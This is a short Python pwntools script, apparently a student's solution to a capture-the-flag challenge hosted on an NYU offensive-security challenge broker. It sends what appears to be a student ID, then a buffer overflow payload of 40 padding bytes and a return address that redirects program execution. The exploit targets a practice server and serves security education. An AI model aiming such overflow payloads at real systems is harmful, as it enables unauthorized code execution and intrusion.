#!/usr/bin/env python3
from pwn import *
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1237

context.log_level = 'debug'
conn = remote(host,port)
conn.recvuntil(': ')
conn.send('jc9093\n')
conn.recvuntil('?')
conn.send('A'*40 + '\x9d\x06\x40')

